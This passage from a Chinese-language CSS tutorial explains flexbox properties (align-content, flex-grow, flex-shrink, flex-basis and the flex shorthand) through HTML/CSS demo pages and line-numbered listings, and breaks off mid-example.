.j:after{ top: 4.95em; }\n    </style>\n</head>\n<body>\n    <article>\n    <p>align-items: baseline;</p>\n    <div style="align-items: baseline;">\n      <div class="a">A</div><div class="b">BB<br>BB</div><div class="c">CCC<br>CCC<br>CCC</div>\n      <div class="d">DDDD<br>DDDD<br>DDDD<br>DDDD</div><div class="e">EEEEE<br>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE</div>\n      <div class="f">FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF</div>\n      <div class="g">GGGGG<br>GGGGG<br>GGGGG<br>GGGGG<br>GGGGG</div><div class="h">HHHH<br>HHHH<br>HHHH<br>HHHH</div>\n      <div class="i">III<br>III<br>III</div><div class="j">JJ<br>JJ</div>\n    </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n以上代码效果图：\n\n\n\n# 2.8 align-content\n\n上一小节的align-items是让一行里的flex项在交叉轴方向上进行对齐，而这一小节要说的是align-content，让flex容器中所有行在交叉轴方向上进行对齐。\n\n也就是说align-content是支持多行的，不支持flex-wrap: nowrap。它的取值flex-start | flex-end | center | space-between | space-around | space-evenly | stretch。\n\n * flex-start：让所有行与交叉轴start进行对齐，也就是让剩余空间全部放到交叉轴end方向。\n * flex-end：让所有行与交叉轴end进行对齐，也就是让剩余空间全部放到主轴start方向。\n * center：让所有行在交叉轴中间对齐，也就是让剩余空间放到交叉轴两边，行与行之间不留空隙。\n * space-between：行与行之间的空间会相同，第一行与start之间不留空隙，最后一行与end之间不留空隙。\n * space-around：行与行之间的空间会相同，第一行与start有空隙而其数值是行与行之间空隙的一半，最后一行与end有空隙而其数值是行与行之间空隙的一半。\n * space-evenly：行与行之间的空间会相同，第一行与start有空隙而其数值就等于行与行之间的空隙，最后一行与end有空隙而其数值就等于行与行之间的空隙。\n * stretch：默认值，行与行之间没有空隙（与start和end也没有），会将剩余空间平分给每行（行内），让它们形成一种拉伸的效果。\n\n<html>\n<head>\n  <style>\n  body { font-size: 12px; text-align: center; }\n  article { float: left; width: 250px; margin-left: 20px; margin-bottom: 10px; }\n  article > div { display: flex; flex-direction: row; align-items: stretch;\n    flex-wrap: wrap; border: 1px dashed; height: 280px;\n    background-image:\n      repeating-linear-gradient(to bottom, white 0px, white 5px, rgba(0,0,0,0.075) 5px, rgba(0,0,0,0.075) 10px);\n  }\n  div { background-color: rgba(0,0,0,0.1); }\n  div > div { border: 1px solid; flex: 1 0 auto; background-color: rgb(208,208,208); letter-spacing: 2px; }\n  .k { flex: 1 0 95%; }\n  p { margin: 0; }\n  </style>\n</head>\n<body>\n  <article>\n  <p>align-content: stretch;</p>\n  <div style="align-content: stretch;">\n    <div>A</div><div>BB<br>BB</div><div>CCC<br>CCC<br>CCC</div>\n    <div>DDDD<br>DDDD<br>DDDD<br>DDDD</div><div>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE</div>\n    <div>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF</div>\n    <div>GGGGG<br>GGGGG<br>GGGGG<br>GGGGG</div><div>HHHH<br>HHHH<br>HHHH</div>\n    <div>III<br>III</div><div>JJ</div><div class="k">K</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content: flex-start</p>\n  <div style="align-content: flex-start">\n    <div>A</div><div>BB<br>BB</div><div>CCC<br>CCC<br>CCC</div>\n    <div>DDDD<br>DDDD<br>DDDD<br>DDDD</div><div>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE</div>\n    <div>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF</div>\n    <div>GGGGG<br>GGGGG<br>GGGGG<br>GGGGG</div><div>HHHH<br>HHHH<br>HHHH</div>\n    <div>III<br>III</div><div>JJ</div><div class="k">K</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content: flex-end</p>\n  <div style="align-content: flex-end">\n    <div>A</div><div>BB<br>BB</div><div>CCC<br>CCC<br>CCC</div>\n    <div>DDDD<br>DDDD<br>DDDD<br>DDDD</div><div>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE</div>\n    <div>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF</div>\n    <div>GGGGG<br>GGGGG<br>GGGGG<br>GGGGG</div><div>HHHH<br>HHHH<br>HHHH</div>\n    <div>III<br>III</div><div>JJ</div><div class="k">K</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content: center;</p>\n  <div style="align-content: center">\n    <div>A</div><div>BB<br>BB</div><div>CCC<br>CCC<br>CCC</div>\n    <div>DDDD<br>DDDD<br>DDDD<br>DDDD</div><div>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE</div>\n    <div>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF</div>\n    <div>GGGGG<br>GGGGG<br>GGGGG<br>GGGGG</div><div>HHHH<br>HHHH<br>HHHH</div>\n    <div>III<br>III</div><div>JJ</div><div class="k">K</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content:  space-between;</p>\n  <div style="align-content: space-between;">\n    <div>A</div><div>BB<br>BB</div><div>CCC<br>CCC<br>CCC</div>\n    <div>DDDD<br>DDDD<br>DDDD<br>DDDD</div><div>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE</div>\n    <div>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF</div>\n    <div>GGGGG<br>GGGGG<br>GGGGG<br>GGGGG</div><div>HHHH<br>HHHH<br>HHHH</div>\n    <div>III<br>III</div><div>JJ</div><div class="k">K</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content:  space-around;</p>\n  <div style="align-content: space-around;">\n    <div>A</div><div>BB<br>BB</div><div>CCC<br>CCC<br>CCC</div>\n    <div>DDDD<br>DDDD<br>DDDD<br>DDDD</div><div>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE</div>\n    <div>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF</div>\n    <div>GGGGG<br>GGGGG<br>GGGGG<br>GGGGG</div><div>HHHH<br>HHHH<br>HHHH</div>\n    <div>III<br>III</div><div>JJ</div><div class="k">K</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content:  space-evenly;</p>\n  <div style="align-content: space-evenly;">\n    <div>A</div><div>BB<br>BB</div><div>CCC<br>CCC<br>CCC</div>\n    <div>DDDD<br>DDDD<br>DDDD<br>DDDD</div><div>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE<br>EEEEE</div>\n    <div>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF<br>FFFFFF</div>\n    <div>GGGGG<br>GGGGG<br>GGGGG<br>GGGGG</div><div>HHHH<br>HHHH<br>HHHH</div>\n    <div>III<br>III</div><div>JJ</div><div class="k">K</div>\n  </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n\n\n以上代码效果图：\n\n\n然后溢出的话与justify-content基本类似，align-content: start、align-content: space-between以及align-content: stretch都是在end端溢出，align-content: center、align-content: space-around以及align-content: space-evenly是两端溢出，align-content: end是start端溢出。\n\n\n# 三、flex项\n\nflex容器的直接子元素作为flex项，就算直接子元素是文本也会作为一个匿名flex项，直接子元素使用:: before或:: after生成的元素也算作flex项。\n\n\n# 3.1 flex项上的无效设置\n\n 1. 对flex项使用float和clear是没有效果的，会忽略这两个设置。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .parent { display: flex; border: 1px solid red; width: 500px; }\n        .parent > div { width: 100px; height: 100px; }\n        .parent > div:nth-of-type(1) { background-color: red; }\n        .parent > div:nth-of-type(2) { float: right; background-color: yellow; }\n        .parent > div:nth-of-type(3) { background-color: blue; }\n        </style>\n    </head>\n    <body>\n        <div class="parent">\n          <div class="col"></div>\n          <div class="col"></div>\n          <div class="col"></div>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n\n 2. 内联级别的flex项会被“块状化”，也就是可以显示设置宽高，与其他的flex项没有什么差别。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .parent { display: flex; border: 1px solid red; width: 500px; }\n        span { border: 1px solid green; width: 85px; height: 85px; }\n        .div { width: 100px; height: 100px; border: 1px solid blue; margin: 10px; }\n        a { border: 1px solid green; width: 30px; height: 30px; }\n        </style>\n    </head>\n    <body>\n        <div class="parent">\n            <span>This is text.</span>\n            <div class="div"></div>\n            <a>link</a>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 3. vertical-align也会对flex项无效，不过对flex项内部文本等内联元素有效\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .parent { display: flex; border: 1px solid red; width: 500px; }\n        span { border: 1px solid green; width: 85px; height: 85px; line-height: 85px; vertical-align: middle; }\n        .div { width: 100px; height: 100px; border: 1px solid blue; margin: 10px; }\n        a { border: 1px solid green; width: 30px; height: 30px; line-height: 30px; vertical-align: middle; }\n        </style>\n    </head>\n    <body>\n        <div class="parent">\n            <span>This is text.</span>\n            <div class="div"></div>\n            <a>link</a>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 4. 大部分与布局有关的属性都会在flex项上失效，但是除了绝对定位以外，它在flex容器中不参与flex布局，脱离文档流，但是会受到flex的一部分影响。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .parent { display: flex; border: 1px solid red; width: 500px; }\n        span { border: 1px solid green; width: 85px; height: 85px; line-height: 85px; vertical-align: middle; }\n        .div {\n            position: absolute;\n            align-self: center; /* 仍然有影响 */\n            width: 100px;\n            height: 100px;\n            border: 1px solid blue;\n            margin: 10px;\n        }\n        a { border: 1px solid green; width: 30px; height: 30px; line-height: 30px; vertical-align: middle; }\n        </style>\n    </head>\n    <body>\n        <div class="parent">\n            <span>This is text.</span>\n            <div class="div"></div>\n            <a>link</a>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    \n\n\n# 3.2 flex-grow\n\nflex-grow属性设置在flex项上，指定flex项的增长因子，默认值是0，也可以是小数，但是不能是负数。如果flex容器有剩余空间，那么会让这些空间按照各个flex项增长因子所占据的比例来分配。\n\n<html>\n<head>\n  <style>\n  div { background-color: rgba(0,0,0,0.1); }\n  article  { font-size: 15px; text-align: center; }\n  p { width: 750px; }\n  article > div { display: flex; width: 750px; border: 1px dashed; }\n  div > div { border: 1px solid; margin: 5px; padding: 30px 0; width: 90px; box-sizing: border-box; }\n  </style>\n</head>\n<body>\n  <article>\n    <p>Flex container</p>\n    <div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n    </div>\n  </article>\n  <article>\n    <p>Flex container</p>\n    <div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n      <div style="flex-grow: 0">flex-grow: 0</div>\n      <div style="flex-grow: 1">flex-grow: 1</div>\n    </div>\n  </article>\n  <article>\n    <p>Flex container</p>\n    <div>\n      <div style="flex-grow: 1">flex-grow: 1</div>\n      <div style="flex-grow: 1">flex-grow: 1</div>\n      <div style="flex-grow: 3">flex-grow: 3</div>\n    </div>\n  </article>\n  <article>\n    <p>Flex container</p>\n    <div>\n      <div style="flex-grow: 0.5">flex-grow: 0.5</div>\n      <div style="flex-grow: 0.5">flex-grow: 0.5</div>\n      <div style="flex-grow: 1.5">flex-grow: 1.5</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n以上代码效果图：\n\n\n\n# 3.3 flex-shrink\n\nflex-shrink属性也是设置在flex项上的，指定flex项的收缩因子，默认值是1，可以是小数，但是不能是负数。如果flex容器一行的空间不够也没有进行换行，那么会让各个flex项按照各自的收缩因子所占据的比例来进行收缩。实在压缩不了就会溢出（前提是nowrap）。\n\n<html>\n<head>\n  <style>\n  div { background-color: rgba(0,0,0,0.1); }\n  article  { font-size: 15px; text-align: center; }\n  p { width: 750px; }\n  article > div { display: flex; width: 750px; border: 1px dashed; }\n  div > div { border: 1px solid; margin: 5px; padding: 30px 0; width: 290px; box-sizing: border-box; }\n  </style>\n</head>\n<body>\n  <article>\n    <p>Flex container</p>\n    <div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n    </div>\n  </article>\n  <article>\n    <p>Flex container</p>\n    <div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n      <div style="flex-shrink: 0">flex-shrink: 0</div>\n      <div style="flex-shrink: 1">flex-shrink: 1</div>\n    </div>\n  </article>\n  <article>\n    <p>Flex container</p>\n    <div>\n      <div style="flex-shrink: 1">flex-shrink: 1</div>\n      <div style="flex-shrink: 1">flex-shrink: 1</div>\n      <div style="flex-shrink: 3">flex-shrink: 3</div>\n    </div>\n  </article>\n  <article>\n    <p>Flex container</p>\n    <div>\n      <div style="flex-shrink: 0.5">flex-shrink: 0.5</div>\n      <div style="flex-shrink: 0.5">flex-shrink: 0.5</div>\n      <div style="flex-shrink: 1.5">flex-shrink: 1.5</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n以上代码效果图：\n\n\n在flex-wrap那节提过“flex项不换行，flex项不见得是溢出，可能是调整大小”，原因是flex-shrink默认值是1，flex容器宽度不够所有flex项的显式设置总宽时，就会压缩各自的宽度（在主轴上占用空间）。\n\n<html>\n<head>\n    <style>\n    /*没有溢出，调整了大小*/\n    .outer { width: 300px; display: flex; background-color: skyblue; flex-wrap: nowrap; }\n    .outer div { box-sizing: border-box; height: 100px; width: 100px; }\n    .div1 { border: 1px solid red; }\n    .div2 { border: 1px solid blue; }\n    .div3 { border: 1px solid green; }\n    .div4 { border: 1px solid yellow; }\n    </style>\n</head>\n<body>\n    <div class="outer">\n      <div class="div1">1</div>\n      <div class="div2">2</div>\n      <div class="div3">3</div>\n      <div class="div4">4</div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 3.4 flex-basis\n\nflex-basis属性也是设置在flex项上的，用于决定flex项的初始大小或默认大小，这个大小是相对于“盒模型”而言（标准盒模型还是IE盒模型）。它的优先级会高于width设置（column排列时就是height），可以使用具体长度数值或者百分数。但是它的优先级不会高于min-width、min-height、max-width、max-height。\n\n<html>\n<head>\n  <style>\n  body { font-size: 20px; text-align: center; }\n  div { background-color: rgba(0,0,0,0.1); }\n  article  { width: 520px; box-sizing: content-box; }\n  article > div {\n    display: flex;\n    border: 1px dashed;\n    padding: 2px;\n    min-height: 100px;\n  }\n  div > div {\n    border: 1px solid;\n    margin: 2px;\n    padding: 40px 0;\n    font-size: 1rem;\n  }\n  </style>\n</head>\n<body>\n<article>\n  <p>Flex container</p>\n  <div>\n    <div style="width: 100px">width: 100px</div>\n    <div style="width: 200px">width: 200px</div>\n    <div style="width: 300px">width: 300px</div>\n  </div>\n</article>\n<article>\n  <p>Flex container</p>\n  <div>\n    <div style="width: 100px;\n    flex-basis: 200px;">width: 100px;<br>\n    flex-basis: 200px;</div>\n    <div style="width: 200px;\n    flex-basis: 300px;">width: 200px;<br>\n    flex-basis: 300px;</div>\n    <div style="width: 300px;\n    flex-basis: 100px;">width: 300px;<br>\n    flex-basis: 100px;</div>\n  </div>\n</article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\nflex-basis：content中的content取值在很多浏览器中都没有实现，我们只是简单了解一下，它其实相当于flex-basis: auto; width: auto;，意思是flex项的大小完全取决于内容的大小。\n\nflex-basis：auto比较常见，也是默认设置。表示flex项大小为“未成为flex项之前的大小”，也就是说会看width和height的值，如果width和height的值为auto，那么flex-basis：auto最后还是会取决于内容的大小。\n\n<html>\n<head>\n  <style>\n    body { font-size: 20px; text-align: center;}\n    div { background-color: rgba(0,0,0,0.1); }\n    article  { width: 540px; box-sizing: content-box; }\n    article > div {\n      display: flex;\n      outline: 1px dashed;\n      padding: 3px;\n      min-height: 100px;\n    }\n    div > div {\n      outline: 1px solid;\n      margin: 3px;\n      padding: 30px 0;\n      font-size: 1rem;\n    }\n  </style>\n</head>\n<body>\n<article>\n  <p>flex-basis: auto;没有显式设置宽度</p>\n  <div>\n    <div style="flex-basis: auto">\n      flex-basis: auto<br>\n      width: auto\n    </div>\n    <div style="flex-basis: auto">\n      flex-basis: auto<br>\n      width: auto\n    </div>\n    <div style="flex-basis: auto">\n      flex-basis: auto<br>\n      width: auto\n    </div>\n  </div>\n</article>\n<article>\n  <p>flex-basis: auto;有显式设置宽度</p>\n  <div>\n    <div style="flex-basis: auto; width: 100px;">\n      flex-basis: auto;<br>\n      width: 100px;\n    </div>\n    <div style="flex-basis: auto; width: 150px">\n      flex-basis: auto;<br>\n      width: 150px;\n    </div>\n    <div style="flex-basis: auto; width: 200px">\n      flex-basis: auto;<br>\n      width: 200px;\n    </div>\n  </div>\n</article>\n<article>\n  <p>flex-basis: auto;有显式设置宽度，但过大会自动收缩</p>\n  <div>\n    <div style="flex-basis: auto; width: 2000px">\n      flex-basis: auto<br>\n      width: 2000px\n    </div>\n    <div style="flex-basis: auto; width: 3000px">\n      flex-basis: auto<br>\n      width: 3000px\n    </div>\n    <div style="flex-basis: auto; width: 4000px">\n      flex-basis: auto<br>\n      width: 4000px\n    </div>\n  </div>\n</article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\n以上代码效果图：\n\n\n场景flex-basis: auto; width: auto;下，并且内容都是文本。如果所有flex项的收缩因子都为0，那么都不会换行；如果flex项的收缩因子都不为0，那么按照各自的收缩因子进行收缩，收缩因子都一样大时，flex项里的换行行数相似。\n\n<html>\n<head>\n  <style>\n  body { font-size: 20px; text-align: center; }\n  div { background-color: rgba(0,0,0,0.1); }\n  article  { width: 520px; }\n  article > div { display: flex; border: 1px dashed; padding: 2px; min-height: 100px; flex-wrap: nowrap; }\n  div > div { border: 1px solid; margin: 2px; padding: 10px 0; font-size: 1rem; }\n  p { margin-bottom: 5px; }\n  b { background-color: rgba(255,255,255,0.3); }\n  </style>\n</head>\n<body>\n  <article>\n  <p>same shrink factors</p>\n  <div>\n    <div style="flex-shrink: 1">\n      <b>flex-shrink: 1</b> is set with a few words\n    </div>\n    <div style="flex-shrink: 1; background-color: rgba(0,0,0,0.2);">\n      This has <b>flex-shrink: 1;</b> and <i>background-color: rgba(0, 0, 0, 0.2);</i> set with a lot of additional text, unlike other flex items across a few lines.\n    </div>\n    <div style="flex-shrink: 1">\n      This too has <b>flex-shrink: 1</b> with a medium amount of extra content.\n    </div>\n  </div>\n  </article>\n  <article>\n  <p>different shrink factors</p>\n  <div>\n    <div style="flex-shrink: .5">\n      <b>flex-shrink: 0.5</b> is set with a few words\n    </div>\n    <div style="flex-shrink: 1; background-color: rgba(0,0,0,0.2);">\n      This has <b>flex-shrink: 1;</b> and <i>background-color: rgba(0, 0, 0, 0.2);</i> set with a lot of additional text, unlike other flex items across a few lines.\n    </div>\n    <div style="flex-shrink: 1">\n      This too has <b>flex-shrink: 1</b> with a medium amount of extra content.\n    </div>\n  </div>\n  </article>\n  <article>\n  <p>null shrink factors</p>\n  <div>\n    <div style="flex-shrink: 0"><b>flex-shrink: 0</b> is set with a few words</div>\n    <div style="flex-shrink: 0; background-color: rgba(0,0,0,0.2);">\n      This has <b>flex-shrink: 0;</b> and <i>background-color: rgba(0, 0, 0, 0.2);</i> set with a lot of additional text, unlike other flex items across a few lines.\n    </div>\n    <div style="flex-shrink: 0">\n      This too has <b>flex-shrink: 0</b> with a medium amount of extra content.\n    </div>\n  </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n以上代码效果图：\n\n\n\n# 3.5 flex\n\nflex属性是flex-grow、flex-shrink和flex-basis的缩写，我们强烈建议使用flex来替代那三个属性。\n\n常用写法如下：\n\n/* 一个值, 无单位数字: flex-grow */\nflex: 2;\n\n/* 一个值, width/height: flex-basis */\nflex: 10em;\nflex: 30px;\nflex: min-content;\n\n/* 两个值: flex-grow | flex-basis */\nflex: 1 30px;\n\n/* 两个值: flex-grow | flex-shrink */\nflex: 2 2;\n\n/* 三个值: flex-grow | flex-shrink | flex-basis */\nflex: 2 2 10%;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n回顾一下默认值：\n\n 1. 如果没有声明flex，也没有声明flex-grow，那么增长因子默认为0。如果声明了flex但是省略了增长因子和收缩因子，那么增长因子默认为1。\n 2. 如果没有声明flex，也没有声明flex-shrink，那么收缩因子默认为1。如果声明了flex但是省略了收缩因子，其实收缩因子仍然是1。\n 3. 如果没有声明flex，也没有声明flex-basis，那么基础尺寸为auto。如果声明了flex但是省略了基础尺寸，那么基础尺寸默认为0。\n\nflex属性还有几种取值：\n\n * flex: initial：根据width属性来调整flex项的尺寸，同时允许收缩。其实就是flex: 0 1 auto。\n * flex: auto：根据width属性来调整flex项的尺寸，同时允许收缩和增长。其实就是flex: 1 1 auto。\n * flex: none：根据width属性来调整flex项的尺寸，不允许收缩和增长。其实就是flex: 0 0 auto。\n * flex: <number>：增长因子设置为<number>，收缩因子和基础尺寸都为0。\n\nflex: initial的例子：\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; outline: 1px dashed; padding: 3px;}\n    article { width: 600px; }\n    article:nth-of-type(odd) { width: 300px; }\n    div > div {\n      outline: 1px solid; margin: 3px; line-height: 1.5;\n      min-height: 40px; text-align: center;\n    }\n    .initial div div { flex: 0 1 auto; }\n    .hundred div > div { width: 50px; }\n    p { text-align: left; padding-left: 100px; }\n    </style>\n</head>\n<body>\n    <article class="initial">\n    <p>flex: initial;</p>\n    <div>\n    <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n    <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="initial">\n  <p>flex: initial;</p>\n    <div>\n    <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n    <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="initial hundred">\n    <p>flex: initial; width: 50px;</p>\n    <div>\n    <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n    <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="initial hundred">\n    <p>flex: initial;  width: 50px;</p>\n    <div>\n    <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n    <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n以上代码效果图：\n\n\nflex: auto的例子：\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; outline: 1px dashed; padding: 3px;}\n    article { width: 600px; }\n    article:nth-of-type(odd) { width: 300px; }\n    div > div {\n      outline: 1px solid; margin: 3px; line-height: 1.5;\n      min-height: 40px; text-align: center;\n    }\n    .auto div > div { flex: auto; }\n    .hundred div > div { width: 50px; }\n    p { text-align: left; padding-left: 100px; }\n    </style>\n</head>\n<body>\n  <article class="auto">\n    <p>flex: auto;</p>\n    <div>\n      <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n      <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="auto">\n    <p>flex: auto;</p>\n    <div>\n      <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n      <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="auto hundred">\n    <p>flex: auto;  width: 50px;</p>\n    <div>\n      <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n      <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="auto hundred">\n    <p>flex: auto;  width: 50px;</p>\n    <div>\n      <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n      <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n以上代码效果图：\n\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; outline: 1px dashed; padding: 3px;}\n    article { width: 600px; }\n    article:nth-of-type(odd) { width: 300px; }\n    div > div {\n      outline: 1px solid; margin: 3px; line-height: 1.5;\n      min-height: 40px; text-align: center;\n    }\n    .none div > div { flex: none; }\n    .hundred div > div { width: 50px; }\n    p { text-align: left; padding-left: 100px; }\n    </style>\n</head>\n<body>\n  <article class="none">\n    <p>flex: none;</p>\n    <div>\n    <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n    <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="none">\n    <p>flex: none;</p>\n    <div>\n    <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n    <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="none hundred">\n    <p>flex: none;  width: 50px;</p>\n    <div>\n    <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n    <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="none hundred">\n    <p>flex: none;  width: 50px;</p>\n    <div>\n    <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div>\n    <div>E E E E E</div><div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n以上代码效果图：\n\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; outline: 1px dashed; padding: 